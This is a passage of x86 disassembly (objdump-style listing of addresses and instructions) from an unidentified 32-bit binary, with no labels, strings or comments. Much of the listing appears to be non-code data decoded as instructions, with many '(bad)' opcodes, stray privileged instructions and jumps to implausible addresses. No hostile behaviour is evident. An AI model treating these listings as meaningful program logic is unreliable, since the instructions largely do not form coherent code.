  402659:	or     esi,DWORD PTR [ebx-0x1ff516fe]
  40265f:	add    DWORD PTR [eax],eax
  402661:	fldl2t 
  402663:	or     DWORD PTR [eax],eax
  402665:	jmp    0xe9405ad8
  40266a:	outs   dx,BYTE PTR ds:[esi]
  40266b:	hlt    
  40266c:	(bad)  
  40266d:	call   0xfd409bf1
  402672:	leave  
  402673:	pop    edi
  402674:	add    cl,ch
  402676:	outs   dx,BYTE PTR ds:[esi]
  402677:	push   esp
  402678:	add    cl,ch
  40267a:	outs   dx,BYTE PTR ds:[esi]
  40267b:	adc    al,0x0
  40267d:	jmp    0xdb40dc01
  402682:	test   eax,0x6ee8fff7
  402687:	fs add cl,ch
  40268a:	outs   dx,BYTE PTR ds:[esi]
  40268b:	and    al,0x0
  40268d:	jmp    0x402692
  402692:	add    BYTE PTR [edi-0x6b],bh
  402695:	add    cl,ch
  402697:	jle    0x40269d
  402699:	add    cl,ch
  40269b:	outs   dx,BYTE PTR ds:[esi]
  40269c:	test   BYTE PTR [eax],al
  40269e:	jmp    0xe9406b11
  4026a3:	jg     0x402674
  4026a5:	add    cl,cl
  4026a7:	imul   edx,edx,0x336ee9ff
  4026ad:	add    cl,ch
  4026af:	outs   dx,BYTE PTR ds:[esi]
  4026b0:	repz push ebx
  4026b3:	jle    0x40263a
  4026b5:	add    bl,bh
  4026b7:	dec    ecx
  4026b8:	icebp  
  4026b9:	(bad)  
  4026ba:	call   0xe9407a2d
  4026bf:	outs   dx,BYTE PTR ds:[esi]
  4026c0:	adc    eax,DWORD PTR [eax]
  4026c2:	jmp    0xd940ec46
  4026c7:	sub    esp,edi
  4026c9:	(bad)  
  4026ca:	call   0xe9408a3d
  4026cf:	push   ds
  4026d0:	and    eax,DWORD PTR [eax]
  4026d2:	jmp    0xe940cbe8
  4026d7:	push   cs
  4026d8:	add    eax,DWORD PTR [eax]
  4026da:	jmp    0x40a9dd
  4026df:	or     al,0xce
  4026e1:	inc    eax
  4026e2:	add    ah,bl
  4026e4:	into   
  4026e5:	loop   0x4026e7
  4026e7:	int3   
  4026e8:	cld    
  4026e9:	add    eax,0x58cdcc00
  4026ee:	add    ah,cl
  4026f0:	int    0x18
  4026f2:	add    ah,bl
  4026f4:	into   
  4026f5:	xchg   edx,eax
  4026f6:	add    BYTE PTR [eax],al
  4026f8:	add    BYTE PTR [eax],al
  4026fa:	add    BYTE PTR [eax],al
  4026fc:	iret   
  4026fd:	cld    
  4026fe:	cmp    al,BYTE PTR [eax]
  402700:	int3   
  402701:	int    0x78
  402703:	add    ah,cl
  402705:	int    0x38
  402707:	add    BYTE PTR [esi+ecx*8-0x332ff2e],bl
  40270e:	adc    BYTE PTR [eax],al
  402710:	mov    ebp,cs
  402712:	push   0x28cd8c00
  402717:	add    BYTE PTR [esi+ecx*8-0x3263ff4e],bl
  40271e:	or     BYTE PTR [eax],al
  402720:	mov    ebp,cs
  402722:	mov    BYTE PTR [eax],al
  402724:	mov    ebp,cs
  402726:	dec    eax
  402727:	add    BYTE PTR [esi+ecx*8-0xe],bl
  40272b:	add    BYTE PTR [esp+edi*8+0x3],cl
  40272f:	add    BYTE PTR [ebp+ecx*8+0x54],cl
  402733:	add    BYTE PTR [ebp+ecx*8+0x14],cl
  402737:	add    BYTE PTR [ebp+ecx*8+0x1],cl
  40273b:	add    DWORD PTR [edi-0x4],ecx
  40273e:	sub    al,BYTE PTR [eax]
  402740:	dec    esp
  402741:	int    0x74
  402743:	add    BYTE PTR [ebp+ecx*8+0x34],cl
  402747:	add    BYTE PTR [esi+ecx*8],bl
  40274a:	retf   0x4d00
  40274d:	cld    
  40274e:	or     al,0x0
  402750:	or     al,0xcd
  402752:	add    BYTE PTR fs:[ecx*8-0x31e3ffdc],cl
  40275a:	stos   BYTE PTR es:[edi],al
  40275b:	add    BYTE PTR [ebp-0x25],dh
  40275e:	sti    
  40275f:	add    al,0x0
  402761:	add    BYTE PTR [eax],al
  402763:	add    BYTE PTR [eax],al
  402765:	jne    0x402742
  402767:	sti    
  402768:	test   BYTE PTR [ebp-0x25],dh
  40276b:	sti    
  40276c:	inc    esp
  40276d:	jne    0x40274a
  40276f:	cld    
  402770:	jmp    0xdb75:0x80aab75
  402777:	sti    
  402778:	pop    esp
  402779:	jne    0x402756
  40277b:	sti    
  40277c:	sbb    al,0x75
  40277e:	(bad)  
  402780:	call   0xdb75:0x530acf75
  402787:	sti    
  402788:	jl     0x4027ff
  40278a:	(bad)  
  40278c:	cmp    al,0x75
  40278e:	(bad)  
  402790:	fidiv  DWORD PTR [ebp-0x53]
  402793:	or     dl,BYTE PTR [edi]
  402795:	jne    0x402772
  402797:	sti    
  402798:	ins    BYTE PTR es:[edi],dx
  402799:	jne    0x402776
  40279b:	sti    
  40279c:	sub    al,0x75
  40279e:	(bad)  
  4027a0:	mov    edx,0xcfbdb75
  4027a5:	jne    0x402782
  4027a7:	sti    
  4027a8:	mov    WORD PTR [ebp-0x25],?
  4027ab:	sti    
  4027ac:	dec    esp
  4027ad:	jne    0x402788
  4027af:	cld    
  4027b0:	cli    
  4027b1:	jne    0x40275c
  4027b3:	or     al,BYTE PTR [ebx]
  4027b5:	jne    0x402790
  4027b7:	sti    
  4027b8:	push   edx
  4027b9:	jne    0x402794
  4027bb:	sti    
  4027bc:	adc    dh,BYTE PTR [ebp-0x2a]
  4027bf:	sti    
  4027c0:	ret    0xcc75
  4027c3:	or     ah,BYTE PTR [ebx]
  4027c5:	jne    0x4027a0
  4027c7:	sti    
  4027c8:	jb     0x4027ca
  4027ca:	add    BYTE PTR [eax],al
  4027cc:	add    BYTE PTR [eax],al
  4027ce:	jne    0x4027a9
  4027d0:	sti    
  4027d1:	xor    dh,BYTE PTR [ebp-0x27]
  4027d4:	cld    
  4027d5:	(bad)  
  4027d6:	jne    0x402782
  4027d8:	or     cl,BYTE PTR [ebx]
  4027da:	jne    0x4027b5
  4027dc:	sti    
  4027dd:	bound  esi,QWORD PTR [ebp+0x2]
  4027e0:	jmp    0xe9427fe0
  4027e5:	cli    
  4027e6:	rol    DWORD PTR [edx],cl
  4027e8:	jmp    0xe9429fe8
  4027ed:	sti    
  4027ee:	test   DWORD PTR [edx],0x237fbe9
  4027f4:	jmp    0xd942fbf3
  4027f9:	or     BYTE PTR [edx+0x2],bh
  4027fc:	jmp    0xe94267fc
  402801:	sti    
  402802:	outs   dx,DWORD PTR ds:[esi]
  402803:	add    ch,cl
  402805:	cli    
  402806:	jecxz  0x40280a
  402808:	std    
  402809:	or     BYTE PTR [esi],dh
  40280b:	add    ch,cl
  40280d:	sti    
  40280e:	aas    
  40280f:	add    ch,cl
  402811:	sti    
  402812:	outs   dx,DWORD PTR ds:[esi]
  402813:	add    ch,cl
  402815:	cli    
  402816:	ret    
  402817:	add    bl,bl
  402819:	or     BYTE PTR [esi+0xffbe902],al
  40281f:	add    ch,cl
  402821:	sti    
  402822:	pop    edi
  402823:	add    ch,cl
  402825:	cli    
  402826:	ret    
  402827:	add    ch,cl
  402829:	sti    
  40282a:	outs   dx,DWORD PTR ds:[esi]
  40282b:	add    ch,cl
  40282d:	sti    
  40282e:	out    dx,eax
  40282f:	add    ch,cl
  402831:	sti    
  402832:	add    BYTE PTR [eax],al
  402834:	add    BYTE PTR [eax],al
  402836:	add    BYTE PTR [edi+0x63fae902],bh
  40283c:	add    bl,cl
  40283e:	or     BYTE PTR [eax+0x2],bh
  402841:	jmp    0xe942ec41
  402846:	sti    
  402847:	imul   eax,DWORD PTR [edx],0xffffffa9
  40284a:	sti    
  40284b:	dec    edx
  40284c:	iret   
  40284d:	cli    
  40284e:	or     BYTE PTR [esi-0x3c0416fe],al
  402854:	add    ch,cl
  402856:	sti    
  402857:	imul   eax,DWORD PTR [edx],0xffffffe9
  40285a:	cli    
  40285b:	cmp    eax,DWORD PTR [edx]
  40285d:	add    al,bl
  40285f:	ins    DWORD PTR es:[edi],dx
  402860:	(bad)  
  402861:	(bad)  
  402862:	call   0xe9409085
  402867:	push   cs
  402868:	sub    BYTE PTR [eax],al
  40286a:	jmp    0xe940c87e
  40286f:	inc    BYTE PTR [edi]
  402871:	add    cl,ch
  402873:	inc    BYTE PTR [edi+0x47eee900]
  402879:	add    cl,ch
  40287b:	out    dx,eax
  40287c:	fild   WORD PTR [eax]
  40287e:	fldcw  WORD PTR [ebp-0x7]
  402881:	(bad)  
  402882:	call   0xe9405865
  402887:	into   
  402888:	out    dx,eax
  402889:	(bad)  
  40288a:	call   0xfd40985e
  40288f:	ins    DWORD PTR es:[edi],dx
  402890:	arpl   WORD PTR [eax],ax
  402892:	jmp    0xe9407855
  402897:	scas   al,BYTE PTR es:[edi]
  402898:	verw   cx
  40289b:	add    BYTE PTR [eax],al
  40289d:	add    BYTE PTR [eax],al
  40289f:	add    BYTE PTR [edi+0x6ddb00af],ch
  4028a5:	jmp    0x4028a6
  4028a7:	call   0xe940884a
  4028ac:	mov    ds,WORD PTR [edi]
  4028ae:	add    cl,ch
  4028b0:	(bad)  
  4028b1:	pop    DWORD PTR [eax]
  4028b3:	jmp    0xe9402836
  4028b8:	jle    0x402939
  4028ba:	add    cl,ch
  4028bc:	outs   dx,BYTE PTR ds:[esi]
  4028bd:	cmp    eax,0xcd6fe900
  4028c2:	add    cl,bl
  4028c4:	jnp    0x4028c9
  4028c6:	add    dh,dl
  4028c8:	jae    0x4028cd
  4028ca:	add    edx,edi
  4028cc:	jnp    0x4028c1
  4028ce:	inc    DWORD PTR [ecx]
  4028d0:	jb     0x4028d5
  4028d2:	adc    al,bh
  4028d4:	jnp    0x4028dd
  4028d6:	add    al,dh
  4028d8:	jae    0x4028dd
  4028da:	add    al,0x0
  4028dc:	push   ecx
  4028dd:	add    eax,0x5490041
  4028e2:	add    DWORD PTR [eax+0x3c],eax
  4028e5:	add    eax,0x5440003
  4028ea:	add    DWORD PTR [edx],eax
  4028ec:	adc    bl,bh
  4028ee:	and    BYTE PTR [eax],al
  4028f0:	or     bl,bh
  4028f2:	add    BYTE PTR [eax],ah
  4028f4:	(bad)  
  4028f5:	cli    
  4028f6:	or     BYTE PTR [eax],al
  4028f8:	push   es
  4028f9:	sti    
  4028fa:	add    BYTE PTR [eax],cl
  4028fc:	sar    dl,cl
  4028fe:	add    BYTE PTR [eax],0x9c
  402901:	sti    
  402902:	(bad)  
  402903:	inc    DWORD PTR [eax]
  402905:	add    BYTE PTR [eax],al
  402907:	add    BYTE PTR [eax],al
  402909:	mov    esp,0xc30001fa
  40290e:	cli    
  40290f:	add    BYTE PTR [ecx],0xcf
  402912:	cli    
  402913:	sbb    BYTE PTR [eax],al
  402915:	ja     0x402912
  402917:	add    BYTE PTR [eax],bl
  402919:	mov    ebp,0xc50006fa
  40291e:	cli    
  40291f:	add    BYTE PTR [esi],al
  402921:	sar    edx,1
  402923:	pusha  
  402924:	add    cl,cl
  402926:	cli    
  402927:	add    BYTE PTR [eax-0x44],ah
  40292a:	cli    
  40292b:	add    eax,DWORD PTR [eax]
  40292d:	(bad)  
  40292e:	cli    
  40292f:	add    BYTE PTR [ebx],al
  402931:	nop
  402932:	cli    
  402933:	xor    BYTE PTR [eax],al
  402935:	mov    dl,bh
  402937:	add    BYTE PTR [eax],dh
  402939:	jle    0x402935
  40293b:	or     al,0x0
  40293d:	xchg   dl,bh
  40293f:	add    BYTE PTR [edx+edx*2],cl
  402942:	cli    
  402943:	rol    BYTE PTR [eax],0x1c
  402946:	cli    
  402947:	(bad)  
  402948:	(bad)  
  402949:	cmp    al,0x1
  40294b:	adc    DWORD PTR [eax],eax
  40294d:	add    DWORD PTR ds:[eax],eax
  402950:	add    BYTE PTR [ecx+eax*1+0x7],al
  402954:	add    BYTE PTR [ebp+0x1],al
  402957:	push   es
  402958:	add    BYTE PTR [ebp-0x1f],dh
  40295b:	add    eax,DWORD PTR ds:0x403e075
  402961:	jne    0x40293a
  402963:	add    eax,DWORD PTR [ebx]
  402965:	jne    0x402945
  402967:	add    eax,DWORD PTR [edx]
  402969:	jne    0x402950
  40296b:	add    eax,DWORD PTR [ecx]
  40296d:	add    BYTE PTR [eax],al
  40296f:	add    BYTE PTR [eax],al
  402971:	add    BYTE PTR [ebp-0x54],dh
  402974:	add    eax,DWORD PTR [eax]
  402976:	jne    0x402953
  402978:	add    eax,DWORD PTR [eax]
  40297a:	jne    0x4029d1
  40297c:	adc    eax,DWORD PTR [edi]
  40297e:	mov    al,BYTE PTR [edi]
  402980:	gs push cs
  402982:	or     esi,DWORD PTR [ecx+0x34]
  402985:	or     DWORD PTR [edx+eiz*8],ecx
  402988:	(bad)  
  402989:	ins    DWORD PTR es:[edi],dx
  40298a:	jb     0x4029e8
  40298c:	xlat   BYTE PTR ds:[ebx]
  40298d:	push   0x65
  40298f:	into   
  402990:	test   al,0x63
  402992:	int3   
  402993:	ja     0x402a0d
  402995:	fs repz test al,0x7b
  402999:	fstp   TBYTE PTR [ebx+0x47]
  40299c:	mov    ebx,esp
  40299e:	cmp    al,0xd5
  4029a0:	(bad)  
  4029a2:	aad    0x62
  4029a4:	lods   al,BYTE PTR ds:[esi]
  4029a5:	ror    BYTE PTR [edx],cl
  4029a7:	mov    al,0x3f
  4029a9:	mov    dh,0x7c
  4029ab:	push   cs
  4029ac:	dec    edi
  4029ad:	mov    cl,0x23
  4029af:	fsub   QWORD PTR [eax]
  4029b1:	mov    eax,0xbef02992
  4029b6:	in     eax,0xbe
  4029b8:	repz mov dh,0x68
  4029bb:	sub    DWORD PTR [ebx],esp
  4029bd:	mov    al,0xf
  4029bf:	mov    ds:0x1c86b954,eax
  4029c4:	inc    esp
  4029c5:	mov    esi,0xdab7c6f9
  4029ca:	(bad)  
  4029cb:	xor    bh,ah
  4029cd:	fst    st(0)
  4029cf:	push   0xffffff98
  4029d1:	aam    0x61
  4029d3:	and    eax,0xd388
  4029d8:	add    BYTE PTR [eax],al
  4029da:	add    dh,dh
  4029dc:	add    bh,BYTE PTR [edi+0x28efd96b]
  4029e2:	fwait
  4029e3:	into   
  4029e4:	xchg   bx,ax
  4029e6:	int3   
  4029e7:	xlat   BYTE PTR ds:[ebx]
  4029e8:	int    0xfd
  4029ea:	mov    ebx,0x2fb67898
  4029ef:	je     0x4029e7
  4029f1:	pop    ds
  4029f2:	pop    edi
  4029f3:	jnp    0x402a54
  4029f5:	mov    dl,BYTE PTR [eax]
  4029f7:	push   0xffffffc8
  4029f9:	hlt    
  4029fa:	(bad)  
  4029fb:	jp     0x402a7a
  4029fd:	mov    cl,0x24
  4029ff:	fwait
  402a00:	pop    es
  402a01:	aas    
  402a02:	hlt    
  402a03:	lea    edi,[esi]
  402a05:	int    0x43
  402a07:	xchg   ebp,eax
  402a08:	mov    ch,0x5b
  402a0a:	push   ebx
  402a0b:	pop    edx
  402a0c:	mov    al,ds:0xe76e898
  402a11:	es mov eax,0x87b43779
  402a17:	push   0x7f9742b0
  402a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a1d:	mov    ds:0xd16009c,eax
  402a22:	ins    BYTE PTR es:[edi],dx
  402a23:	pop    es
  402a24:	inc    ecx
  402a25:	mov    edi,0x29a7febb
  402a2a:	retf   
  402a2b:	icebp  
  402a2c:	sahf   
  402a2d:	mov    ah,BYTE PTR [eax-0x33]
  402a30:	adc    ah,dh
  402a32:	das    
  402a33:	ret    0xa645
  402a36:	inc    eax
  402a38:	scas   al,BYTE PTR es:[edi]
  402a39:	adc    BYTE PTR [edi],cl
  402a3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a3c:	xchg   edi,eax
  402a3d:	xchg   ebp,eax
  402a3e:	adc    al,0x0
  402a40:	add    BYTE PTR [eax],al
  402a42:	add    BYTE PTR [eax],al
  402a44:	lods   al,BYTE PTR ds:[esi]
  402a45:	and    al,0x23
  402a47:	add    al,0xa3
  402a49:	xor    DWORD PTR [ecx+0x33],ebp
  402a4c:	mov    ds:0x4562f7ba,al
  402a51:	mov    edi,DWORD PTR [eax+ebx*8+0x21]
  402a55:	and    DWORD PTR [edx],ecx
  402a57:	enter  0x3426,0x0
  402a5b:	push   eax
  402a5c:	loop   0x4029e6
  402a5e:	iret   
  402a5f:	ficomp WORD PTR [ebx]
  402a61:	lea    edi,[eax+0x27fff987]
  402a67:	icebp  
  402a68:	mov    esi,0xe5b5f05
  402a6d:	inc    ch
  402a6f:	lds    ecx,FWORD PTR [edi-0x9]
  402a72:	mov    al,0x6e
  402a74:	lds    ebx,FWORD PTR [ebx+0x2f]
  402a77:	fsub   DWORD PTR [edx+0x5a]
  402a7a:	pop    eax
  402a7b:	inc    edx
  402a7c:	or     ah,BYTE PTR [edx-0x3f]
  402a7f:	lods   al,BYTE PTR ds:[esi]
  402a80:	jae    0x402ae6
  402a82:	mov    dh,0x79
  402a84:	mov    bh,0xae
  402a86:	jbe    0x402a6f
  402a88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a8a:	add    DWORD PTR [ebp+0x398b056],edx
  402a90:	jmp    0xf3b11a4a
  402a95:	nop
  402a96:	jno    0x402a76
  402a98:	or     edx,DWORD PTR [esi+eax*1-0x60752d74]
  402a9f:	cli    
  402aa0:	or     cl,BYTE PTR [edx+0x30f4be8]
  402aa6:	js     0x402a7d
  402aa8:	add    BYTE PTR [eax],al
  402aaa:	add    BYTE PTR [eax],al
  402aac:	add    BYTE PTR [edi-0x2198f0ff],ch
  402ab2:	clc    
  402ab3:	xchg   ebp,eax
  402ab4:	icebp  
  402ab5:	push   ds
  402ab6:	cld    
  402ab7:	loopne 0x402afb
  402ab9:	stos   DWORD PTR es:[edi],eax
  402aba:	pop    eax
  402abb:	jg     0x402a89
  402abd:	jae    0x402b1c
  402abf:	or     BYTE PTR [esi+0x3a],bl
  402ac2:	xchg   cx,ax
  402ac4:	call   0x5e268a2b
  402ac9:	inc    edi
  402aca:	push   edi
  402acb:	imul   ecx,ebx,0x17
  402ace:	pop    esi
  402acf:	sbb    al,0x31
  402ad1:	test   WORD PTR gs:[edi+0xf26476],bx
  402ad9:	rcl    DWORD PTR [eax+0x6],0x6c
  402add:	aaa    
  402ade:	mov    eax,ds:0xb18d1b01
  402ae3:	or     BYTE PTR [edx-0xaf03e15],al
  402ae9:	call   0xb7ac:0xfc65b09c
  402af0:	adc    dh,BYTE PTR [esi+0x7d]
  402af3:	mov    esi,0xb94e008b
  402af8:	cld    
  402af9:	push   ebx
  402afa:	fcomp  st(4)
  402afc:	(bad)  
  402afd:	in     eax,0xe8
  402aff:	fst    DWORD PTR ds:0x8cd3391f
  402b05:	stc    
  402b06:	or     esp,edx
  402b08:	sti    
  402b09:	mov    ah,0x5f
  402b0b:	mov    dl,0x4d
  402b0d:	ror    BYTE PTR [edi],cl
  402b0f:	mov    ch,0x3a
  402b11:	add    BYTE PTR [eax],al
  402b13:	add    BYTE PTR [eax],al
  402b15:	add    BYTE PTR [eax-0x415c4402],bl
  402b1b:	out    dx,al
  402b1c:	mov    edx,0xdfa39dd4
  402b21:	dec    edx
  402b22:	or     edx,DWORD PTR [eax+ebx*8+0x3d]
  402b26:	xor    edx,eax
  402b28:	shl    DWORD PTR [edi+eax*1+0x66d3d6b3],1
  402b2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b30:	imul   eax,DWORD PTR [ebx-0x20],0x8a346e97
  402b37:	inc    esi
  402b38:	lods   eax,DWORD PTR ds:[si]
  402b3a:	in     al,dx
  402b3b:	jbe    0x402b9d
  402b3d:	fisubr DWORD PTR [edi-0x6bbfc16]
  402b43:	fild   DWORD PTR [edx]
  402b45:	xor    eax,DWORD PTR [ebx-0x2a55f5f6]
  402b4b:	cmp    cl,BYTE PTR ds:0x52f50dd
  402b51:	push   eax
  402b52:	out    0x3f,al
  402b54:	add    ah,BYTE PTR [edi]
  402b56:	jne    0x402b23
  402b58:	repz or dh,BYTE PTR [ebx]
  402b5b:	popa   
  402b5c:	and    al,0xc
  402b5e:	cmp    al,0xf6
  402b60:	nop
  402b61:	push   0x6f814cca
  402b66:	xchg   ebp,eax
  402b67:	loop   0x402b18
  402b69:	data16 or al,0x38
  402b6c:	loopne 0x402bcf
  402b6e:	cmp    edx,ecx
  402b70:	int3   
  402b71:	fisub  WORD PTR [ebx-0x7326427d]
  402b77:	mov    ebp,0xd06b
  402b7c:	add    BYTE PTR [eax],al
  402b7e:	add    ch,ah
  402b80:	cs pushf 
  402b82:	xlat   BYTE PTR ds:[ebx]
  402b83:	xor    ch,BYTE PTR [eax+0x5abcb308]
  402b89:	stc    
  402b8a:	mov    bl,0x4b
  402b8c:	xchg   esp,eax
  402b8d:	daa    
  402b8e:	mov    ebp,0xba5805ca
  402b93:	xor    eax,0x10b886fb
  402b98:	jno    0x402b30
  402b9a:	mov    edi,0xb6e5dedf
  402b9f:	jbe    0x402bf6
  402ba1:	mov    ch,0xb1
  402ba3:	popa   
  402ba4:	add    al,BYTE PTR [ebx-0x2b]
  402ba7:	iret   
  402ba8:	ja     0x402bfc
  402baa:	sar    al,cl
  402bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bad:	and    ebx,ebx
  402baf:	jns    0x402c0d
  402bb1:	icebp  
  402bb2:	fild   DWORD PTR [esi-0x33]
  402bb5:	(bad)  
  402bb6:	(bad)  
  402bb7:	(bad)  
  402bb8:	pop    esi
  402bb9:	push   cs
  402bba:	fs loope 0x402b6d
  402bbd:	pop    ebp
  402bbe:	ins    DWORD PTR es:[edi],dx
  402bbf:	add    BYTE PTR [ebx+0x2d],0x6a
  402bc3:	das    
  402bc4:	aam    0xba
  402bc6:	push   cs
  402bc7:	cdq    
  402bc8:	and    eax,0xb80609ca
  402bcd:	cdq    
  402bce:	add    BYTE PTR [edi+0xa],bh
  402bd1:	imul   eax,DWORD PTR [edi],0x76ad0208
  402bd7:	jb     0x402bab
  402bd9:	cmp    esp,DWORD PTR [esi-0x2a3e7e93]
  402bdf:	je     0x402bc9
  402be1:	dec    esi
  402be2:	lds    eax,FWORD PTR [eax]
  402be4:	add    BYTE PTR [eax],al
  402be6:	add    BYTE PTR [eax],al
  402be8:	jae    0x402c43
  402bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402beb:	xor    dl,bh
  402bed:	iret   
  402bee:	xor    ah,BYTE PTR [edx-0x30]
  402bf1:	cmp    BYTE PTR [eax+0x45e9e111],0x1
  402bf8:	ficomp WORD PTR [eax-0x61]
  402bfb:	out    dx,al
  402bfc:	es leave 
  402bfe:	or     DWORD PTR [esi],ebx
  402c00:	es jp  0x402bb6
  402c03:	dec    ebp
  402c04:	dec    edi
  402c05:	repz sbb al,0x3d
  402c08:	dec    eax
  402c09:	pusha  
  402c0a:	xchg   esi,eax
  402c0b:	stos   BYTE PTR es:[edi],al
  402c0c:	fmul   st(1),st
  402c0e:	add    dl,bl
  402c10:	fstp   TBYTE PTR [eax-0x56]
  402c13:	mov    edx,ecx
  402c15:	out    dx,eax
  402c16:	adc    edi,DWORD PTR [ecx-0x3b]
  402c19:	(bad)
  402c1e:	pop    edi
  402c1f:	jne    0x402c45
  402c21:	mov    ds:0xacdc6ad,al
  402c26:	cmp    edx,esi
  402c28:	retf   0xb837
  402c2b:	popa   
  402c2c:	push   ds
  402c2d:	mov    dl,0x46
  402c2f:	xor    DWORD PTR [ecx],ebx
  402c31:	mov    eax,ds:0x8080294
  402c36:	and    dl,BYTE PTR [edx]
  402c38:	pop    es
  402c39:	cmp    eax,ebx
  402c3b:	sbb    eax,0xed2daa70
  402c40:	ins    BYTE PTR es:[edi],dx
  402c41:	xchg   edi,eax
  402c42:	lahf   
  402c43:	ds jbe 0x402c56
  402c46:	or     DWORD PTR [esi+0x71],ecx
  402c49:	inc    ecx
  402c4a:	stos   BYTE PTR es:[edi],al
  402c4b:	fld    DWORD PTR [eax]
  402c4d:	add    BYTE PTR [eax],al
  402c4f:	add    BYTE PTR [eax],al
  402c51:	adc    eax,0x12a914a7
  402c56:	call   0xf031:0x580f8600
  402c5d:	cld    
  402c5e:	pop    ecx
  402c5f:	inc    esi
  402c60:	jne    0x402c4a
  402c62:	popa   
  402c63:	retf   
  402c64:	add    esi,eax
  402c66:	pusha  
  402c67:	mov    esp,0x25572b89
  402c6c:	pop    ss
  402c6d:	push   ebx
  402c6e:	pop    edx
  402c6f:	push   edx
  402c70:	pop    esp
  402c71:	(bad)  
  402c72:	test   bl,0xea
  402c75:	mov    ch,0xfb
  402c77:	mov    edx,0x22014770
  402c7c:	(bad)  
  402c7d:	xchg   esp,eax
  402c7e:	std    
  402c7f:	push   esp
  402c80:	addr16 jo 0x402c0f
  402c83:	(bad)
  402c86:	xchg   BYTE PTR [edx+0x2b8e637b],dh
  402c8c:	in     eax,0xc8
  402c8e:	xchg   ebx,eax
  402c8f:	pop    esp
  402c90:	dec    esi
  402c91:	sub    al,0xaf
  402c93:	ret    0xddb8
  402c96:	mov    cl,0xb5
  402c98:	bound  ebx,QWORD PTR [edi-0x1333d357]
  402c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c9f:	pop    ebx
  402ca0:	cdq    
  402ca1:	cmp    BYTE PTR [esi-0x65],bl
  402ca4:	pop    es
  402ca5:	and    esp,DWORD PTR [ebx-0x14]
  402ca8:	jne    0x402cc3
  402caa:	pop    esp
  402cab:	jne    0x402c90
  402cad:	popa   
  402cae:	push   ebp
  402caf:	add    dl,BYTE PTR [eax-0x164068c]
  402cb5:	add    BYTE PTR [eax],al
  402cb7:	add    BYTE PTR [eax],al
  402cb9:	add    BYTE PTR [eax+edi*8-0xaa9316],al
  402cc0:	jno    0x402c9c
  402cc2:	test   DWORD PTR [edx],eax
  402cc4:	add    eax,0x9587806b
  402cc9:	cmc    
  402cca:	sub    BYTE PTR [edx-0x6e6eb81e],cl
  402cd0:	jnp    0x402ca3
  402cd2:	cdq    
  402cd3:	mov    WORD PTR [eax+eax*1],cs
  402cd6:	pop    ss
  402cd7:	dec    ecx
  402cd8:	rcl    BYTE PTR [edx-0x1a2a8777],cl
  402cde:	push   ebx
  402cdf:	stos   BYTE PTR es:[edi],al
  402ce0:	fdivr  QWORD PTR [ebp+edi*4-0x67]
  402ce4:	fisttp DWORD PTR [ebx]
  402ce6:	inc    eax
  402ce7:	(bad)  
  402ce8:	rol    DWORD PTR [esi-0xe2b2332],cl
  402cee:	les    ebp,FWORD PTR [esi-0x23]
  402cf1:	push   0x1fda7f2a
  402cf6:	test   eax,0x1781bdd3
  402cfb:	and    al,0xb9
  402cfd:	idiv   BYTE PTR [ebp+0x36fb032]
  402d03:	inc    ebx
  402d04:	mov    bh,0x18
  402d06:	jb     0x402d1f
  402d08:	or     BYTE PTR [eax-0xf0d824],cl
  402d0e:	push   esi
  402d0f:	test   BYTE PTR ds:0xc6d866,0x11
  402d16:	jnp    0x402d73
  402d18:	pop    DWORD PTR gs:0xf8626c
  402d1f:	add    BYTE PTR [eax],al
  402d21:	add    BYTE PTR [eax],al
  402d23:	outs   dx,DWORD PTR ds:[esi]
  402d24:	mov    edx,0x8ad1616b
  402d29:	ins    BYTE PTR es:[edi],dx
  402d2a:	push   ss
  402d2b:	xchg   esp,eax
  402d2c:	loopne 0x402d38
  402d2e:	mov    al,ds:0xd70d912a
  402d33:	mov    al,0x81
  402d35:	add    al,0x4e
  402d37:	push   ds
  402d38:	jb     0x402d3d
  402d3a:	cmp    DWORD PTR ds:0x23a766e4,ebp
  402d40:	aad    0x5f
  402d42:	rcr    BYTE PTR [ecx-0x18b696fb],1
  402d48:	xor    eax,0x28863e6e
  402d4d:	shr    DWORD PTR [esi-0x2629e708],1
  402d53:	jne    0x402d4a
  402d55:	cli    
  402d56:	fidiv  WORD PTR ds:0x6ad80b6b
  402d5c:	call   0x9f0ce9f6
  402d61:	mov    bx,0xccb3
  402d65:	mov    dh,0xb2
  402d67:	xor    al,BYTE PTR [edx-0xba4a39]
  402d6d:	sar    DWORD PTR [ebp-0x453dae48],1
  402d73:	aas    
  402d74:	jmp    0x402de8
  402d76:	mov    bl,0xc6
  402d78:	jge    0x402d1d
  402d7a:	mov    ah,0x99
  402d7c:	(bad)  
  402d7d:	or     eax,0xfe281fd0
  402d82:	(bad)  
  402d83:	inc    eax
  402d84:	add    ch,BYTE PTR [edi]
  402d86:	fiadd  WORD PTR [eax]
  402d88:	add    BYTE PTR [eax],al
  402d8a:	add    BYTE PTR [eax],al
  402d8c:	mov    eax,ds:0x96d95f54
  402d91:	lods   eax,DWORD PTR ds:[esi]
  402d92:	dec    ecx
  402d93:	pushw  es
  402d95:	arpl   WORD PTR [edx],di
  402d97:	popa   
  402d98:	cmp    ecx,ebx
  402d9a:	jmp    0x4f6f:0x1b4fc867
  402da1:	test   BYTE PTR [ebp+0x7639e10b],al
  402da7:	or     al,0x36
  402da9:	mov    al,0xa6
  402dab:	add    eax,0x2d726af
  402db0:	push   eax
  402db1:	fild   DWORD PTR [ebx]
  402db3:	add    BYTE PTR [ebp+0x1a],dh
  402db6:	adc    eax,0x61598c1b
  402dbb:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  402dbd:	cwde   
  402dbe:	xor    ch,BYTE PTR ds:0x6cc0d78e
  402dc4:	push   ecx
  402dc5:	push   ds
  402dc6:	shl    BYTE PTR [edi+0x50],1
  402dc9:	push   ebp
  402dca:	sahf   
  402dcb:	pop    edx
  402dcc:	and    ebx,DWORD PTR [ebp+ebp*2-0xefdcdbf]
  402dd3:	jns    0x402d71
  402dd5:	mov    ecx,0xb2b78b30
  402dda:	arpl   bx,bx
  402ddc:	call   0xf5e0:0xa9aca2c7
  402de3:	ss loopne 0x402d7b
  402de6:	sub    al,0x46
